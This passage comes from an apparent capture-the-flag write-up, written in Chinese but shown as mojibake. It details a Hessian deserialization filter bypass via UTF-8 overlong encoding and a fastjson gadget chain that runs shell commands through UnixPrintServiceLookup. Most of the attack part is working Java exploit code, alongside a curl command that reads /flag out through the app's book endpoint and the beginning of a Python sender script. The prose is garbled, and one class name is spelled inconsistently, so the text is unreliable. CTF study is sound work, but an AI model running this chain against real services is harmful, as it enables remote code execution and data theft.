aus.groovy.runtime.<br>org.datanucleus.store.rdbms.datasource.dbcp.datasources.<br>org.dom4j.<br>org.eclipse.jetty.util.log.<br>org.geotools.filter.<br>org.h2.value.<br>org.hibernate.tuple.component.<br>org.hibernate.type.<br>org.jboss.ejb3.<br>org.jboss.proxy.ejb.<br>org.jboss.resteasy.plugins.server.resourcefactory.<br>org.jboss.weld.interceptor.builder.<br>org.junit.<br>org.mockito.internal.creation.cglib.<br>org.mortbay.log.<br>org.mockito.<br>org.thymeleaf.<br>org.quartz.<br>org.springframework.aop.aspectj.<br>org.springframework.beans.BeanWrapperImpl$BeanPropertyHandler<br>org.springframework.beans.factory.<br>org.springframework.expression.spel.<br>org.springframework.jndi.<br>org.springframework.orm.<br>org.springframework.transaction.<br>org.yaml.snakeyaml.tokens.<br>ognl.<br>pstore.shaded.org.apache.commons.collections.<br>sun.print.<br>sun.rmi.server.<br>sun.rmi.transport.<br>weblogic.ejb20.internal.<br>weblogic.jms.common.<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå› ä¸ºç›´æ¥æ£€æµ‹åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œé‚£å°±å¯ä»¥ç›´æ¥åˆ©ç”¨UTF-8 Overlong Encodingæ–¹æ³•ç»•è¿‡ï¼Œè™½ç„¶æ˜¯Hessianä½†æœ¬è´¨ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼ŒX1r0zâœŒçš„æ–‡ç« æœ‰è¯´ï¼š<a href="https://exp10it.io/2024/02/hessian-utf-8-overlong-encoding/">https://exp10it.io/2024/02/hessian-utf-8-overlong-encoding/</a></p><p>é‡Œé¢ä¹Ÿæœ‰å†™å¥½çš„ä»£ç ï¼Œè¿™é‡Œcopyä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hessian2OutputWithOverlongEncoding</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Hessian2Output</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Hessian2OutputWithOverlongEncoding</span><span class="hljs-params">(OutputStream os)</span> &#123;<br>        <span class="hljs-built_in">super</span>(os);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printString</span><span class="hljs-params">(String v, <span class="hljs-type">int</span> strOffset, <span class="hljs-type">int</span> length)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">offset</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) getSuperFieldValue(<span class="hljs-string">&quot;_offset&quot;</span>);<br>        <span class="hljs-type">byte</span>[] buffer = (<span class="hljs-type">byte</span>[]) getSuperFieldValue(<span class="hljs-string">&quot;_buffer&quot;</span>);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; length; i++) &#123;<br>            <span class="hljs-keyword">if</span> (SIZE &lt;= offset + <span class="hljs-number">16</span>) &#123;<br>                setSuperFieldValue(<span class="hljs-string">&quot;_offset&quot;</span>, offset);<br>                flushBuffer();<br>                offset = (<span class="hljs-type">int</span>) getSuperFieldValue(<span class="hljs-string">&quot;_offset&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-type">char</span> <span class="hljs-variable">ch</span> <span class="hljs-operator">=</span> v.charAt(i + strOffset);<br><br>            <span class="hljs-comment">// 2 bytes UTF-8</span><br>            buffer[offset++] = (<span class="hljs-type">byte</span>) (<span class="hljs-number">0xc0</span> + (convert(ch)[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0x1f</span>));<br>            buffer[offset++] = (<span class="hljs-type">byte</span>) (<span class="hljs-number">0x80</span> + (convert(ch)[<span class="hljs-number">1</span>] &amp; <span class="hljs-number">0x3f</span>));<br><br><span class="hljs-comment">//            if (ch &lt; 0x80)</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (ch);</span><br><span class="hljs-comment">//            else if (ch &lt; 0x800) &#123;</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0xc0 + ((ch &gt;&gt; 6) &amp; 0x1f));</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0x80 + (ch &amp; 0x3f));</span><br><span class="hljs-comment">//            &#125;</span><br><span class="hljs-comment">//            else &#123;</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0xe0 + ((ch &gt;&gt; 12) &amp; 0xf));</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0x80 + ((ch &gt;&gt; 6) &amp; 0x3f));</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0x80 + (ch &amp; 0x3f));</span><br><span class="hljs-comment">//            &#125;</span><br>        &#125;<br><br>        setSuperFieldValue(<span class="hljs-string">&quot;_offset&quot;</span>, offset);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printString</span><span class="hljs-params">(<span class="hljs-type">char</span>[] v, <span class="hljs-type">int</span> strOffset, <span class="hljs-type">int</span> length)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">offset</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) getSuperFieldValue(<span class="hljs-string">&quot;_offset&quot;</span>);<br>        <span class="hljs-type">byte</span>[] buffer = (<span class="hljs-type">byte</span>[]) getSuperFieldValue(<span class="hljs-string">&quot;_buffer&quot;</span>);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; length; i++) &#123;<br>            <span class="hljs-keyword">if</span> (SIZE &lt;= offset + <span class="hljs-number">16</span>) &#123;<br>                setSuperFieldValue(<span class="hljs-string">&quot;_offset&quot;</span>, offset);<br>                flushBuffer();<br>                offset = (<span class="hljs-type">int</span>) getSuperFieldValue(<span class="hljs-string">&quot;_offset&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-type">char</span> <span class="hljs-variable">ch</span> <span class="hljs-operator">=</span> v[i + strOffset];<br><br>            <span class="hljs-comment">// 2 bytes UTF-8</span><br>            buffer[offset++] = (<span class="hljs-type">byte</span>) (<span class="hljs-number">0xc0</span> + (convert(ch)[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0x1f</span>));<br>            buffer[offset++] = (<span class="hljs-type">byte</span>) (<span class="hljs-number">0x80</span> + (convert(ch)[<span class="hljs-number">1</span>] &amp; <span class="hljs-number">0x3f</span>));<br><br><span class="hljs-comment">//            if (ch &lt; 0x80)</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (ch);</span><br><span class="hljs-comment">//            else if (ch &lt; 0x800) &#123;</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0xc0 + ((ch &gt;&gt; 6) &amp; 0x1f));</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0x80 + (ch &amp; 0x3f));</span><br><span class="hljs-comment">//            &#125;</span><br><span class="hljs-comment">//            else &#123;</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0xe0 + ((ch &gt;&gt; 12) &amp; 0xf));</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0x80 + ((ch &gt;&gt; 6) &amp; 0x3f));</span><br><span class="hljs-comment">//                buffer[offset++] = (byte) (0x80 + (ch &amp; 0x3f));</span><br><span class="hljs-comment">//            &#125;</span><br>        &#125;<br><br>        setSuperFieldValue(<span class="hljs-string">&quot;_offset&quot;</span>, offset);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span>[] convert(<span class="hljs-type">int</span> i) &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">b1</span> <span class="hljs-operator">=</span> ((i &gt;&gt; <span class="hljs-number">6</span>) &amp; <span class="hljs-number">0b11111</span>) | <span class="hljs-number">0b11000000</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">b2</span> <span class="hljs-operator">=</span> (i &amp; <span class="hljs-number">0b111111</span>) | <span class="hljs-number">0b10000000</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123; b1, b2 &#125;;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getSuperFieldValue</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getClass().getSuperclass().getDeclaredField(name);<br>            f.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">return</span> f.get(<span class="hljs-built_in">this</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setSuperFieldValue</span><span class="hljs-params">(String name, Object val)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getClass().getSuperclass().getDeclaredField(name);<br>            f.setAccessible(<span class="hljs-literal">true</span>);<br>            f.set(<span class="hljs-built_in">this</span>, val);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åè¿™é‡Œè¿˜æœ‰ä¸€ä¸ªfastjson1.2.83çš„ç‰ˆæœ¬ï¼Œå¯ä»¥ç›´æ¥ç”¨fastjsonåŸç”Ÿååºåˆ—åŒ–çš„é‚£æ¡é“¾å­ï¼Œä¸è¿‡å› ä¸ºæœ‰äº›ç±»è¢«banäº†æˆ‘ä»¬éœ€è¦ç»•è¿‡ï¼Œå…ˆçœ‹ä¸€ä¸‹æœ¬æ¥çš„é“¾å­</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ObjectInputStream.readObject -&gt; <br>HashMap.readObject -&gt; <br>BadAttributeValueExpException.readObject -&gt; <br>JSONArray.toString -&gt; <br>JSON.toString ï¼ˆJSONArray extends JSONï¼‰-&gt; <br>JSON.toJSONString -&gt; <br>TemplatesImpl.getOutputProperties -&gt; <br>TemplatesImpl.newTransformer<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡ŒBadAttributeValueExpExceptionå’ŒTemplatesImpléƒ½è¢«è¿‡æ»¤äº†ï¼Œéœ€è¦æ‰¾å…¶ä»–ç±»æ›¿æ¢ä¸€ä¸‹ï¼ŒBadAttributeValueExpExceptionæˆ‘ä»¬å¯ä»¥æ›¿æ¢æˆ<strong>XString</strong>ï¼Œå› ä¸ºXStringé€šè¿‡equalsæ¥è§¦å‘toStringï¼Œè€ŒHashMapååºåˆ—åŒ–çš„æ—¶å€™åˆšå¥½ä¼šè§¦å‘</p><p>ç„¶åTemplatesImpléƒ¨åˆ†çš„è§¦å‘å¯ä»¥æ¢æˆUnixPrintServiceLookupï¼Œä¸è¿‡è¿™ä¸ªç±»åªåœ¨Unixä¸‹é¢æ‰æœ‰ç”¨ï¼Œè€Œè¿™éƒ¨åˆ†çš„åˆ©ç”¨å°±åœ¨æˆ‘å‰é¢è¯´åˆ°çš„ç»•è¿‡sofa-hessiançš„issueé‡Œé¢</p><p><img src="https://cdn.clown2024.cn/image-20250112000746624.png" alt="image-20250112000746624"></p><p>è¿™å¾—ç”¨Linuxä¸‹çš„ideaè°ƒäº†ã€‚ã€‚ã€‚</p><h2 id="unixprintservicelookupç±»"><a href="#UnixPrintServiceLookupç±»" class="headerlink" title="UnixPrintServiceLookupç±»"></a>UnixPrintServiceLookupç±»</h2><p>è¿™é‡Œæ¥è°ƒä¸€ä¸‹ä»–çš„åˆ©ç”¨æ–¹å¼ï¼Œå› ä¸ºä¹‹å‰æ²¡è§è¿‡ï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://whoopsunix.com/docs/components/Dubbo/CVE-2022-39198/">https://whoopsunix.com/docs/components/Dubbo/CVE-2022-39198/</a></p><blockquote><p><code>UnixPrintServiceLookup</code> æ˜¯ Java æ‰“å°æœåŠ¡ API ä¸­çš„ä¸€ä¸ªå¹³å°ç‰¹å®šå®ç°ç±»ï¼Œä¸»è¦ç”¨äºåœ¨ <strong>Unix&#x2F;Linux</strong> ç³»ç»Ÿä¸ŠæŸ¥æ‰¾å’Œç®¡ç†æ‰“å°æœåŠ¡ã€‚å®ƒæ˜¯ <code>PrintServiceLookup</code> çš„ä¸€ä¸ªå­ç±»ï¼Œä¸“é—¨ä¸º Unix ç±»æ“ä½œç³»ç»Ÿï¼ˆå¦‚ Linuxã€BSD ç­‰ï¼‰æä¾›æ‰“å°æœåŠ¡çš„æŸ¥æ‰¾å’Œè®¿é—®åŠŸèƒ½ã€‚</p></blockquote><p>è¯¥ç±»åˆ©ç”¨çš„getteræ–¹æ³•æ˜¯sun.print.UnixPrintServiceLookup#getDefaultPrintService()ï¼Œæœ€ç»ˆæ˜¯è§¦å‘åˆ°è¯¥ç±»é‡Œé¢çš„ä¸€ä¸ªexecCmdæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20250112162426855.png" alt="image-20250112162426855"></p><p>è¯¥æ–¹æ³•çš„è°ƒç”¨æœ‰å¾ˆå¤šï¼Œæˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªå‚æ•°æ˜¯æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶çš„ï¼Œè¿™é‡Œæ‰¾åˆ°äº†getDefaultPrinterNameBSD()æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20250112170753639.png" alt="image-20250112170753639"></p><p><img src="https://cdn.clown2024.cn/image-20250112170831539.png" alt="image-20250112170831539"></p><p>è¿™é‡Œä¼ å…¥çš„å‚æ•°éƒ½æ˜¯å±æ€§å€¼ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡åå°„æ¥æ§åˆ¶äº†</p><p>ä¸è¿‡è¦èµ°åˆ°è¿™æˆ‘ä»¬éœ€è¦æ»¡è¶³å‰é¢ä¸¤ä¸ªæ¡ä»¶ï¼ŒisMac()å’ŒisSysV()åˆ¤æ–­çš„æ˜¯ä½ çš„ç³»ç»Ÿæ˜¯å¦ä¸ºmacOSå’ŒSunOSï¼Œå¯ä»¥ç”¨åå°„ç»•è¿‡ï¼Œæˆ‘ç”¨kaliçš„å°±ä¸ç”¨æ‹…å¿ƒï¼›</p><p>è¿˜æœ‰å°±æ˜¯isCupsRunning()æ–¹æ³•ï¼ŒisCupsRunningæ˜¯æ£€æµ‹æœ¬æœºçš„CUPSæœåŠ¡ï¼Œå¯ä»¥é€šè¿‡è®¿é—®<code>http://127.0.0.1:631/</code>çœ‹çœ‹æ˜¯å¦å¼€å¯ï¼Œæˆ‘ç”¨çš„kaliæ˜¯æ²¡æœ‰å¼€å¯ï¼Œçœ‹åˆ«äººè¯´Ubuntué»˜è®¤å¼€å¯ï¼Œè¦æ³¨æ„ä¸€ä¸‹ï¼Œå¦‚æœå¼€å¯äº†ç”¨ä¸‹é¢çš„å‘½ä»¤å…³é—­å³å¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">sudo systemctl mask cups<br>reboot<br></code></pre></td></tr></table></figure><p>ç„¶åè°ƒç”¨çš„å†™æ³•ç±»ä¼¼è¿™æ ·</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> sun.print.UnixPrintServiceLookup;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj,String name,Object value)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;touch /tmp/evilfile&quot;</span>;<br><span class="hljs-comment">//        Field theUnsafe = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);</span><br><span class="hljs-comment">//        theUnsafe.setAccessible(true);</span><br><span class="hljs-comment">//        Unsafe unsafe = (Unsafe) theUnsafe.get(null);</span><br><span class="hljs-comment">//        Object unixPrintServiceLookup = unsafe.allocateInstance(UnixPrintServiceLookup.class);</span><br>        <span class="hljs-type">UnixPrintServiceLookup</span> <span class="hljs-variable">unixPrintServiceLookup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnixPrintServiceLookup</span>();<br>        setFieldValue(unixPrintServiceLookup, <span class="hljs-string">&quot;cmdIndex&quot;</span>, <span class="hljs-number">0</span>);<br>        setFieldValue(unixPrintServiceLookup, <span class="hljs-string">&quot;osname&quot;</span>, <span class="hljs-string">&quot;xx&quot;</span>);<br>        setFieldValue(unixPrintServiceLookup, <span class="hljs-string">&quot;lpcFirstCom&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;cmd, cmd, cmd&#125;);<br>        System.out.println(unixPrintServiceLookup.getDefaultPrintService());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250112171343508.png" alt="image-20250112171343508"></p><p>æˆåŠŸæ‰§è¡Œ</p><blockquote><p>ä¸è¿‡è¿™é‡Œæˆ‘çœ‹å¤§éƒ¨åˆ†éƒ½ç”¨Unsafeæ¥è·å–UnixPrintServiceLookupçš„å®ä¾‹ï¼Œå¯è¯¥ç±»çš„æ„é€ æ–¹æ³•æ˜¯publicçš„ï¼Œæˆ‘ä¸Šé¢æ­£å¸¸å†™ä¹Ÿæ˜¯èƒ½æ‰§è¡Œçš„ï¼Œæ€ªğŸ¤”</p></blockquote><h2 id="expæ„é€ "><a href="#expæ„é€ " class="headerlink" title="expæ„é€ "></a>expæ„é€ </h2><p>é‚£ç°åœ¨å°±å¯ä»¥æ¥æ”¹é€ æˆ‘ä»¬çš„expäº†(ç›´æ¥æŠ„æ–‡ç« çš„exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><span class="hljs-keyword">import</span> sun.print.UnixPrintServiceLookup;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Array;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BookExp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj,String name,Object value)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//éœ€è¦æ‰§è¡Œçš„å‘½ä»¤</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;touch /tmp/evilTest&quot;</span>;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">theUnsafe</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>            theUnsafe.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) theUnsafe.get(<span class="hljs-literal">null</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">unixPrintServiceLookup</span> <span class="hljs-operator">=</span> unsafe.allocateInstance(UnixPrintServiceLookup.class);<br>            <span class="hljs-comment">//è®¾ç½®å±æ€§</span><br>            setValue(unixPrintServiceLookup, <span class="hljs-string">&quot;cmdIndex&quot;</span>, <span class="hljs-number">0</span>);<span class="hljs-comment">//ç»•è¿‡getDefaultPrinterNameBSDä¸­çš„é™åˆ¶</span><br>            setValue(unixPrintServiceLookup, <span class="hljs-string">&quot;osname&quot;</span>, <span class="hljs-string">&quot;xx&quot;</span>);<br>            setValue(unixPrintServiceLookup, <span class="hljs-string">&quot;lpcFirstCom&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;cmd, cmd, cmd&#125;);<br><br>            <span class="hljs-comment">//å°è£…ä¸€ä¸ªJSONObjectå¯¹è±¡è°ƒç”¨getteræ–¹æ³•</span><br>            <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>            jsonObject.put(<span class="hljs-string">&quot;xx&quot;</span>, unixPrintServiceLookup);<br><br>            <span class="hljs-comment">//ä½¿ç”¨XStringç±»è°ƒç”¨toStringæ–¹æ³•</span><br>            <span class="hljs-type">XString</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;xx&quot;</span>);<br>            <span class="hljs-type">HashMap</span> <span class="hljs-variable">map1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>            <span class="hljs-type">HashMap</span> <span class="hljs-variable">map2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>            map1.put(<span class="hljs-string">&quot;yy&quot;</span>,jsonObject);<br>            map1.put(<span class="hljs-string">&quot;zZ&quot;</span>,xString);<br>            map2.put(<span class="hljs-string">&quot;yy&quot;</span>,xString);<br>            map2.put(<span class="hljs-string">&quot;zZ&quot;</span>,jsonObject);<br><br>            <span class="hljs-comment">//ä½¿ç”¨åå°„èµ‹å€¼ï¼Œé˜²æ­¢åºåˆ—åŒ–è¿‡ç¨‹è°ƒç”¨equalsæ–¹æ³•</span><br>            <span class="hljs-type">HashMap</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>            setValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>            Class nodeC;<br>            <span class="hljs-keyword">try</span> &#123;<br>                nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( ClassNotFoundException e ) &#123;<br>                nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>            &#125;<br>            <span class="hljs-type">Constructor</span> <span class="hljs-variable">nodeCons</span> <span class="hljs-operator">=</span> nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>            nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>            Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, map1, map1, <span class="hljs-literal">null</span>));<br>            Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, map2, map2, <span class="hljs-literal">null</span>));<br>            setValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br><br>            FileOutputStream fileOutputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser&quot;</span>);<br>            <span class="hljs-type">Hessian2OutPutWithOverlongEncoding</span> <span class="hljs-variable">hessianOutput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2OutPutWithOverlongEncoding</span>(fileOutputStream);<br>            hessianOutput.setSerializerFactory(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>());<br>            hessianOutput.getSerializerFactory().setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>            hessianOutput.writeObject(s);<br>            hessianOutput.flushBuffer();<br><br>            <span class="hljs-comment">// test</span><br>            Hessian2Input hessian2Input=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;ser&quot;</span>));<br>            hessian2Input.readObject();<br><br>        &#125;<span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250112171920831.png" alt="image-20250112171920831"></p><p>okæˆåŠŸæ‰§è¡Œ</p><h2 id="å¸¦å‡ºæ•°æ®"><a href="#å¸¦å‡ºæ•°æ®" class="headerlink" title="å¸¦å‡ºæ•°æ®"></a>å¸¦å‡ºæ•°æ®</h2><p>åŸé¢˜çš„é¶æœºæ˜¯ä¸å‡ºç½‘çš„ï¼Œä¸èƒ½ç›´æ¥å¼¹shellï¼Œæ‰€ä»¥éœ€è¦åˆ©ç”¨ä¸€äº›æ–¹å¼æ¥å¸¦å‡ºæ•°æ®ï¼Œé¢˜ç›®ç»™äº†æˆ‘ä»¬ç›¸å…³çš„ä¸€äº›æœåŠ¡ï¼Œ</p><p>é¢˜ç›®ä¸­çš„<code>/addBook</code> å¯ä»¥åŠ¨æ€æ·»åŠ å›¾ä¹¦å†…å®¹ï¼Œä¸”æ·»åŠ çš„å›¾ä¹¦å†…å®¹å¯ä»¥é€šè¿‡ <code>/getAllBooks</code> å›æ˜¾ï¼Œé‚£å°±å¯ä»¥åˆ©ç”¨è¯¥æ–¹å¼æ‹¿åˆ°æ¥å›æ˜¾flagã€‚</p><p>æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤å°±æ˜¯åˆ©ç”¨curlå»è¯·æ±‚æœåŠ¡æ¥æ·»åŠ flag</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">curl -X POST http://localhost:8080/api/rest/book/addBook -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> -d <span class="hljs-string">&#x27;&#123;&quot;bookId&quot;: 1, &quot;title&quot;: &quot;&#x27;</span>$(<span class="hljs-built_in">cat</span> /flag)<span class="hljs-string">&#x27;&quot;, &quot;author&quot;: &quot;yuanshan&quot;, &quot;publishDate&quot;: &quot;2024-12-22&quot;, &quot;price&quot;: 0.00&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>ç„¶åéœ€è¦å†™ä¸ªè„šæœ¬æ¥å‘åŒ…ï¼Œå› ä¸ºè¦ç›´æ¥å‘hessianæ•°æ®ï¼Œburpä¸å¥½æ“ä½œï¼Œä¹Ÿæ˜¯ç›´æ¥ç”¨æ–‡ç« é‡Œçš„è„šæœ¬å°±å¯ä»¥äº†</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ser&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    body = f.read()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(body))<br><br>url = <span class="hljs-string">&quot;http://localhost:8080/api/rest/book/getBookById&quot;</span><br>headers = &#123; <span 